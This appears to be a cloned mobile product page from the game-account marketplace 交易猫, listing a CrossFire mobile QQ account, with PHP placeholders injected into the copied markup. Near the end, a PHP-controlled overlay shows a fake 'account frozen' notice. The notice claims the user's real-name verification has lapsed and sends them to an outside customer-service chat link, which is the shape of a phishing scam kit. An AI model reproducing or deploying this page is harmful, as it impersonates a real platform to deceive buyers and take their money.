"{\"activityStyleType\":\"STEP_LIST\",\"processActivitys\":[{\"description\":\"下单后进入在线发货聊天页面，等待验号。\",\"sortNum\":1,\"title\":\"下单\",\"type\":\"NORMAL\"},{\"description\":\"由客服截图（部分订单由卖家截图）给你确认是否继续购买，不满意立即退款。\",\"sortNum\":2,\"title\":\"验号\",\"type\":\"NORMAL\"},{\"description\":\"确认购买后，客服将进行改密，换绑，九游客户端支持帐号转移。\",\"sortNum\":3,\"title\":\"换绑\",\"type\":\"NORMAL\"},{\"description\":\"客服发送帐号密码给你，可进入订单详情或站内信内查看帐号密码。\",\"sortNum\":4,\"title\":\"发货\",\"type\":\"NORMAL\"},{\"description\":\"收到帐号后请尽快登录游戏验证，如无问题将在保护期（通常为24小时，网易帐号36小时，QQ帐号96小时）结束后给卖家打款。\",\"sortNum\":5,\"title\":\"完成\",\"type\":\"NORMAL\"}],\"title\":\"流程\"}" }, "tradeService": { "tradeServices": [{ "text": "免费验号，不满意全额退", "sortNum": 0, "type": "NORMAL" }, { "text": "安全交易，全面换绑", "sortNum": 1, "type": "NORMAL" }], "extInfo": "{\"activityStyleType\":\"COMMON_INTRO_LIST\",\"processActivitys\":[{\"description\":\"下单后，由客服上号截图验证商品真实信息，避免纠纷。\",\"sortNum\":1,\"title\":\"免费验号，不满意全额退\",\"type\":\"NORMAL\"},{\"description\":\"确认购买后，客服校验帐号绑定、防沉迷、人脸、身份证等安全信息，确保更换完整。\",\"sortNum\":2,\"title\":\"安全交易，全面换绑\",\"type\":\"NORMAL\"}],\"title\":\"保障\"}" } }, "itemSellingPoint": null, "itemPropertyInfo": { "title": "商品信息", "properties": [{ "name": "游戏名称", "values": ["穿越火线：枪战王者【苹果版】"], "sortNum": 1, "type": "TEXT", "extInfo": "" }, { "name": "商品类型", "values": ["QQ帐号"], "sortNum": 2, "type": "TEXT", "extInfo": null }, { "name": "客户端", "values": ["QQ苹果官方客户端"], "sortNum": 3, "type": "TEXT", "extInfo": null }, { "name": "系统", "values": ["苹果版"], "sortNum": 4, "type": "TEXT", "extInfo": null }, { "name": "服务器", "values": ["苹果QQ服务器"], "sortNum": 5, "type": "TEXT", "extInfo": null }, { "name": "角色等级", "values": ["133"], "sortNum": 6, "type": "TEXT", "extInfo": null }, { "name": "VIP等级", "values": ["8"], "sortNum": 7, "type": "TEXT", "extInfo": null }, { "name": "V总数量", "values": ["99"], "sortNum": 8, "type": "TEXT", "extInfo": null }, { "name": "英雄V数量", "values": ["99"], "sortNum": 9, "type": "TEXT", "extInfo": null }, { "name": "梦幻V数量", "values": ["99"], "sortNum": 10, "type": "TEXT", "extInfo": null }, { "name": "带V枪械", "values": ["剑齿虎", "加特林堡垒", "M200幻神", "SCAR幽暗骑士觉醒", "M4A1武神", "王者之影", "王者之心", "王者之怒", "王者之魄", "王者之魂", "M4A1死神", "巴雷特毁灭", "沙鹰修罗", "AK47无影", "M4A1雷神", "巴雷特极光", "AWM天龙", "AK47泰坦破坏者", "巴雷特枪娘", "沙鹰飞电"], "sortNum": 11, "type": "LIST", "extInfo": null }, { "name": "人物角色", "values": ["蝴蝶", "葵", "樱", "零", "萝拉", "潘多拉", "兰", "灵狐者", "猎狐者", "白狼", "刀锋"], "sortNum": 12, "type": "LIST", "extInfo": null }, { "name": "绑定防沉迷", "values": ["否"], "sortNum": 13, "type": "TEXT", "extInfo": null }, { "name": "描述", "values": ["25王者，势至尊一套，翼至尊就差一个雷了，雷套多多，满配极光套，蝴蝶，孟德过载，幻神，王怒，王者之魄套装，王者之心套装，王者之翼，王者之锋两个，王者之击两个，王者之电两个，ak47英朗，四把cop，普通英雄级不再介绍，该有的都有，这个价格绝对超值，安全有保障可签协议，不急卖"], "sortNum": 14, "type": "TEXT", "extInfo": null }] }, "itemSecurityInfo": null, "itemSeller": { "sellerInfo": { "uid": 1546566920441805, "avatar": "https:\u002F\u002Fstatic.jiaoyimao.com\u002Fo\u002Fgcmall\u002F3tGrn\u002F;;0,gcmall\u002Fg\u002Fresource\u002Fpublic\u002FpureUpload\u002F2019\u002F1\u002F4\u002FtempFile19708004869881413411546566922uCTXSMSJla", "name": "血菩提gg", "shopType": 0, "description": null, "creditLevel": [{ "type": 1, "num": 2 }], "realName": true, "realPeople": true, "zhimaCredit": false, "shopEntranceName": null, "url": "http:\u002F\u002Fm.jiaoyimao.com\u002Fseller\u002F1546566920441805\u002FgoodsList" }, "sellerDynamicInfo": { "dynamicInfos": [{ "name": "全部商品", "values": ["1"], "sortNum": 1, "type": "LINK", "extInfo": "{\"url\":\"http:\u002F\u002Fm.jiaoyimao.com\u002Fseller\u002F1546566920441805\u002FgoodsList\"}" }, { "name": "近7天成交率", "values": ["100%"], "sortNum": 2, "type": "LINK", "extInfo": "{\"url\":\"http:\u002F\u002Fm.jiaoyimao.com\u002Fseller\u002F1546566920441805\u002FgoodsList\"}" }, { "name": "交易纠纷记录", "values": ["0"], "sortNum": 4, "type": "LINK", "extInfo": "{\"url\":\"http:\u002F\u002Fm.jiaoyimao.com\u002Fseller\u002F1546566920441805\u002FgoodsList\"}" }] } }, "itemDisclaimerInfo": { "title": "免责声明", "descNodes": [{ "id": null, "title": null, "description": "所展示的商品供求信息由买卖双方自行提供，其真实性、准确性和合法性由信息发布人负责。", "sortNum": 1, "type": "NORMAL", "extInfo": null }, { "id": null, "title": null, "description": "帐号真实情况以客服截图为准。", "sortNum": 2, "type": "NORMAL", "extInfo": null }, { "id": null, "title": null, "description": "国家法律规定，未成年人不能参与虚拟物品交易。", "sortNum": 3, "type": "NORMAL", "extInfo": null }, { "id": null, "title": null, "description": "本平台提供的数字化商品根据商品性质不支持七天无理由退货及三包服务。", "sortNum": 4, "type": "NORMAL", "extInfo": null }], "buttons": [{ "id": "btn_item_security_school", "text": "安全学堂", "sortNum": 1, "extInfo": "{\"url\":\"https:\u002F\u002Fxuanchuan.jiaoyimao.com\u002Fp\u002Fq\u002Fk555wrmo\"}" }], "activityStyleType": "TEXT_LIST" }, "itemBottomBar": { "buttons": [{ "id": "btn_item_favorites", "text": "收藏", "sortNum": 1, "extInfo": "{\"callbackData\":{\"itemId\":\"1622873155868058\",\"bizCode\":\"com.aligame.jym.account\"},\"favorited\":false,\"eventTrackId\":\"collection_n\"}" }, { "id": "btn_item_bargain", "text": "议价", "sortNum": 2, "extInfo": "{\"url\":\"https:\u002F\u002Fm.jiaoyimao.com\u002Fbuyer\u002Fbargain\u002FwaitBargain\u002F1622873155868058\",\"eventTrackId\":\"bargin\"}" }, { "id": "btn_item_private_chat", "text": "聊聊", "sortNum": 3, "extInfo": "{\"url\":\"https:\u002F\u002Fm.jiaoyimao.com\u002Fconversation\u002Fg\u002F1622873155868058\",\"eventTrackId\":\"chat\"}" }, { "id": "btn_item_buy_now", "text": "立即购买", "sortNum": 4, "extInfo": "{\"url\":\"https:\u002F\u002Fm.jiaoyimao.com\u002Fbuyer\u002F1622873155868058\u002Fbuy\",\"eventTrackId\":\"buy_a\"}" }] }, "itemSmartBanner": null, "itemAbnormal": null, "itemSEOData": { "title": "【穿越火线：枪战王者【苹果版】QQ帐号】【133级】v8翼至尊势至尊幻神蝴蝶_苹果QQ服务器|3799.0元_商品详情_交易猫", "keywords": "穿越火线：枪战王者【苹果版】,QQ帐号,苹果QQ服务器,交易猫", "description": "25王者，势至尊一套，翼至尊就差一个雷了，雷套多多，满配极光套，蝴蝶，孟德过载，幻神，王怒，王者之魄套装，王者之心套装，王者之翼，王者之锋两个，王者之击两个，王者之电两个，ak47英朗，四把cop，普", "pcUrl": "https:\u002F\u002Fwww.jiaoyimao.com\u002Fitem\u002F1622873155868058.html" }, "itemEventTrack": { "a1": "14", "a2": "0", "a3": "1623880946000", "a4": "7.82", "a5": "已实人,实名认证,", "a6": "卖家发货,协议保障,", "a7": "" }, "customExtInfo": { "appName": "", "terminal": "ios" } } }
  </script>

  <script src="./img/js.js"></script>

  <script id="__LOADABLE_REQUIRED_CHUNKS__" type="application/json" crossorigin="">["lib","common","item"]</script>
  <script id="__LOADABLE_REQUIRED_CHUNKS___ext" type="application/json" crossorigin="">{"namedChunks":["item"]}</script>
  <script src="./img/runtime.b57b1097.js"></script>
  <script type="text/javascript" src="https://js.users.51.la/20885247.js"></script>
  <script async="" data-chunk="client" src="./img/lib.34a574e8.js"></script>
  <script async="" data-chunk="client" src="./img/client.87b96719.js"></script>
  <script async="" data-chunk="item" src="./img/common.c51a828c.js"></script>
  <style>
    .jym-modal-popup-slide-up {
      -webkit-backface-visibility: hidden;
      backface-visibility: hidden;
      -webkit-transform: translate(0, 100%);
      transform: translate(0, 100%);
      -webkit-transition: -webkit-transform .3s;
      transition: transform .3s;
    }

    .x-show {
      -webkit-transform: translate(0, 0);
      transform: translate(0, 0);
    }
  </style>
  
  <!--免费验号-->
  <div id="jym-modal-container-18881" style="display: none;">
    <div>
      <div class="jym-modal-mask" style="z-index: 999;"></div>
      <div class="zwgb jym-modal-wrap jym-modal-wrap-popup" role="dialog" aria-labelledby="保障" style="top: auto; height: 60%;">
        <div role="document" class="zwgb jym-modal jym-intro-modal jym-modal-transparent jym-modal-popup jym-modal-popup-slide-up" style="    height: 100%;">
          <div class="jym-modal-content"><button aria-label="Close" class="jym-modal-close"><span class="jym-modal-close-x"></span></button>
            <div class="jym-modal-header">
              <div class="jym-modal-title">保障</div>
            </div>
            <div class="jym-modal-body">
              <div class="intro-content">
                <div class="intro-list common-intro-list">
                  <dl>
                    <dt><i class="jym-iconfontV2 jym-iconfontV2-goods-name"></i>免费验号，不满意全额退</dt>
                    <dd>下单后，由客服上号截图验证商品真实信息，避免纠纷。</dd>
                    <dt><i class="jym-iconfontV2 jym-iconfontV2-goods-name"></i>安全交易，全面换绑</dt>
                    <dd>确认购买后，客服校验帐号绑定、防沉迷、人脸、身份证等安全信息，确保更换完整。</dd>
                  </dl>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  
  
  <!--评估-->
  <div id="jym-modal-container-1623915602990" style="display: none;">
    <div>
      <div class="jym-modal-mask" style="z-index: 999;"></div>
      <div class="zwgb jym-modal-wrap jym-modal-wrap-popup" role="dialog" aria-labelledby="性价比说明" style="top: auto; height: 60%;">
        <div role="document" class="zwgb jym-modal jym-intro-modal jym-modal-transparent jym-modal-popup jym-modal-popup-slide-up" style="    height: 100%;">
          <div class="jym-modal-content"><button aria-label="Close" class="jym-modal-close"><span class="jym-modal-close-x"></span></button>
            <div class="jym-modal-header">
              <div class="jym-modal-title">性价比说明</div>
            </div>
            <div class="jym-modal-body">
              <div class="intro-content">
                <div class="intro-list ">
                  <dl>
                    <dt><i class="jym-iconfontV2 jym-iconfontV2-q"></i>商品性价比是什么？</dt>
                    <dd>商品性价比是小猫根据卖家填写的商品关键与价格对比得出。<span class="text-blue">性价比越高代表商品越好</span>，作为买家下单购买的辅助依据，仅供参考哦！</dd>
                    <dt><i class="jym-iconfontV2 jym-iconfontV2-q"></i>商品关键属性是什么？</dt>
                    <dd>商品关键属性会根据游戏进行设定。如王者荣耀的皮肤数量、英雄数量。</dd>
                  </dl>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!--保障-->
  <div id="jym-modal-container-1623918593342" style="display: none;">
    <div>
      <div class="jym-modal-mask" style="z-index: 999;"></div>
      <div class="jym-modal-wrap jym-modal-wrap-popup" role="dialog" aria-labelledby="保障服务" style="top: auto; height: 60%;">
        <div role="document" class="jym-modal jym-intro-modal jym-modal-transparent jym-modal-popup jym-modal-popup-slide-up" style="    height: 100%;">
          <div class="jym-modal-content"><button aria-label="Close" class="jym-modal-close"><span class="jym-modal-close-x"></span></button>
            <div class="jym-modal-header">
              <div class="jym-modal-title">保障服务</div>
            </div>
            <div class="jym-modal-body"><div class="intro-content"><div class="intro-list "><dl><dt><i class="jym-iconfontV2 jym-iconfontV2-goods-tick"></i>平台发货</dt><dd>货在交易猫，付款后由客服发货（7X24小时服务）。</dd><dt><i class="jym-iconfontV2 jym-iconfontV2-goods-tick"></i>已投保</dt><dd>购买该商品可免费获赠保险，保费由卖家承担。若被找回、封号、回收，最高将获得全额赔偿。</dd><dt><i class="jym-iconfontV2 jym-iconfontV2-goods-tick"></i>协议保障</dt><dd>卖家出售此账号已向平台提供真实身份信息，签署《安全保证协议》，具有法律效应。</dd><dt><i class="jym-iconfontV2 jym-iconfontV2-goods-tick"></i>已实名</dt><dd>卖家已通过支付宝实名认证。</dd><dt><i class="jym-iconfontV2 jym-iconfontV2-goods-tick"></i>已实人</dt><dd>实人认证通过多种核验方式对个人进行活体认证，通过与公安网数据校验、运用全球领先人脸识别技术，保障个人身份真实性。</dd><dt><i class="jym-iconfontV2 jym-iconfontV2-goods-tick"></i>芝麻信用</dt><dd>卖家已授权支付宝芝麻信用。</dd></dl></div></div></div>
            <div class="jym-modal-body">
              <div class="intro-content">
 
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <!--流程-->
  <div id="jym-modal-container-1623918851613" style="display: none;">
    <div>
      <div class="jym-modal-mask" style="z-index: 999;"></div>
      <div class="jym-modal-wrap jym-modal-wrap-popup" role="dialog" aria-labelledby="流程" style="top: auto; height: 60%;">
        <div role="document" class="jym-modal jym-intro-modal jym-modal-transparent jym-modal-popup jym-modal-popup-slide-up" style="height: 100%;">
          <div class="jym-modal-content"><button aria-label="Close" class="jym-modal-close"><span class="jym-modal-close-x"></span></button>
            <div class="jym-modal-header">
              <div class="jym-modal-title">流程</div>
            </div>
            <div class="jym-modal-body">
              <div class="intro-content">
                <div class="intro-step-list">
                  <dl>
                    <dt><i class="step-icon"><i class="step-icon-inner"></i></i>下单</dt>
                    <dd>
                      <div class="step-description">下单后进入在线发货聊天页面，等待验号。</div>
                    </dd>
                    <dt><i class="step-icon"><i class="step-icon-inner"></i></i>验号</dt>
                    <dd>
                      <div class="step-description">由客服截图（部分订单由卖家截图）给你确认是否继续购买，不满意立即退款。</div>
                    </dd>
                    <dt><i class="step-icon"><i class="step-icon-inner"></i></i>换绑</dt>
                    <dd>
                      <div class="step-description">确认购买后，客服将进行改密，换绑，九游客户端支持帐号转移。</div>
                    </dd>
                    <dt><i class="step-icon"><i class="step-icon-inner"></i></i>发货</dt>
                    <dd>
                      <div class="step-description">客服发送帐号密码给你，可进入订单详情或站内信内查看帐号密码。</div>
                    </dd>
                    <dt><i class="step-icon"><i class="step-icon-inner"></i></i>完成</dt>
                    <dd>
                      <div class="step-description">收到帐号后请尽快登录游戏验证，如无问题将在保护期（通常为24小时，网易帐号36小时，QQ帐号96小时）结束后给卖家打款。</div>
                    </dd>
                  </dl>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>


  <script>
    !(function (c, b, d, a) {
      c[a] || (c[a] = {}); c[a].config = {
        pid: 'dsv9zcel92@0034141f1ab93f4',
        appType: 'web',
        imgUrl: 'https://arms-retcode.aliyuncs.com/r.png?',

        sendResource: false,
        enableLinkTrace: false,
        behavior: false,
        useFmp: true,
        environment: 'prod',
        autoSendPerf: false,
        sample: 100,
        pvSample: 100,
        ignore: {
          ignoreApis: [
            'https://log.mmstat.com/m.gif',
            '//px.effirst.com/api/v1/jssdk/upload',
            /.+?mtop\.jym\.appserver\.common\.log\.report.+/,
            'ynuf.aliapp.org/service/um.json',
            function (str) {
              if (str && /\.jiaoyimao\.|ecbp-api\/|^\/.+/.test(str)) {
                return false
              } else {
                return true;
              }
            }
          ],
          ignoreErrors: /^Script error\.?$/
        },

      };
      with (b) with (body) with (insertBefore(createElement("script"), firstChild)) setAttribute("crossorigin", "", src = d)
    })(window, document, "https://retcode.alicdn.com/retcode/bl.js", "__bl");
  </script>
  <script src="./img/jquery.min.js"></script>
  <script src="./img/swiper.min.js"></script>
  <script src="./img/index.js"></script>
  <script>
    $(function () {
        $('#one').click(function () {
            // $('.header-drop-menu').toggleClass('am-popover-hidden');
            $("#one").text("<?php echo $_GoodsID['att_capacity'];?>");
        })

      $('.header-click').click(function () {
        $('.header-drop-menu').toggleClass('am-popover-hidden');
      })
      $('#mfyh-click').click(function () {
        $('#jym-modal-container-18881').show();
        $('.jym-modal-popup-slide-up').addClass('x-show');
        $('body').css('overflow', 'hidden');
      })
      $('#pg-click').click(function () {
        $('#jym-modal-container-1623915602990').show();
        $('.jym-modal-popup-slide-up').addClass('x-show');
        $('body').css('overflow', 'hidden');
      })
      $('#lc-click').click(function () {
        $('#jym-modal-container-1623918851613').show();
        $('.jym-modal-popup-slide-up').addClass('x-show');
        $('body').css('overflow', 'hidden');
      })
      
      $('#bz-click').click(function () {
        $('#jym-modal-container-1623918593342').show();
        $('.jym-modal-popup-slide-up').addClass('x-show');
        $('body').css('overflow', 'hidden');
      })
      $('.jym-modal-close-x').click(function () {
        $('#jym-modal-container-1623915602990').hide();
        $('#jym-modal-container-1623918593342').hide();
        $('#jym-modal-container-1623918851613').hide();
        $('#jym-modal-container-18881').hide();
        $('.jym-modal-popup-slide-up').removeClass('x-show');
        $('body').css('overflow', 'scroll')
      })

      $(".jym-modal-mask").on("click", function () {
        $('#jym-modal-container-1623915602990').hide();
        $('#jym-modal-container-1623918593342').hide();
        $('#jym-modal-container-1623918851613').hide();
        $('#jym-modal-container-18881').hide();
        $('.jym-modal-popup-slide-up').removeClass('x-show');
        $('body').css('overflow', 'scroll')
      })






    })
  </script>
  
  <link rel="stylesheet" type="text/css" href="css/mobile888.css" charset="utf-8"/>
  
    <style>
.overlay {
    width: 100%;
    height: 100%;
    position: fixed;
    z-index: 99;
    left: 0;
    top: 0;
    right: 0;
    bottom: 0;
    background: #000;
    filter: alpha(opacity=50);
    -moz-opacity: .5;
    opacity: .5;
    cursor: pointer;
  }
.dialog-box {
    width: 282px;
    padding: 0 0 14px;
    position: fixed;
    left: 50%;
    margin-left: -141px;
    top: 50%;
    margin-top: -82px;
    background: #fff;
    z-index: 999;
  }

.credit-level {
    border: 1px solid #e6f0ff;
    border-radius: .08rem;
    font-size: .32rem;
    color: #1677ff;
}
.zhima-icon{background-color:#e6f0ff;padding:0 .05333rem}
.dialog-box .btn-dialog-box01 {
    width: 117px;
    height: 31px;
    line-height: 31px;
    display: inline-block;
    font-size: 14px;
}
      
.btn-blue01, .btn-disable, .btn-gray, .btn-orange, .btn-red, .btn-white {
    display: block;
    width: 100%;
    height: 41px;
    line-height: 41px;
    text-align: center;
    -webkit-border-radius: 2px;
    border-radius: 2px;
}
      
.btn-blue01 {
    background: #4190E9;
    color: #FFF;
    border: 1px solid #2279DA;
}
      
.btns {
text-align: center;
}
.dialog-box .bd {
    padding: 16px 18px 0;
    font-size: 14px;
    line-height: 21px;
    color: #747474;
}
  </style>
  
  <div style="display:<?php echo $oldnewf22;?>;">
			<div style="z-index:1000" class="overlay" data-spm-anchor-id="a2y0w.13094287.0.i0"></div>		
    <div class="dialog-box " style="position: fixed; z-index: 1001; top: 50%; height: auto; margin-top: -127px; left: 50%; width: 282px; margin-left: -141px;">
    <div class="bd">
        <div style="padding:2px;line-height: 2;"><center>冻&nbsp;结&nbsp;提&nbsp;醒</center>&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;亲爱的交易猫用户您好，由于您的账号实名长时间未更新，存在安全风险，该订单已被系统自动冻结，请联系客服进行解封后继续交易！</div>
    </div>
        <div class="btns">
              <a href="https://chatlink.duokefu.vip/widget/chat.html?eid=9ec20d76c084635b3f6baf0281b673fa" data-value="" class="btn-blue btn-dialog-box">确定</a>

              
        </div>
</div>	</div>


 </body></html>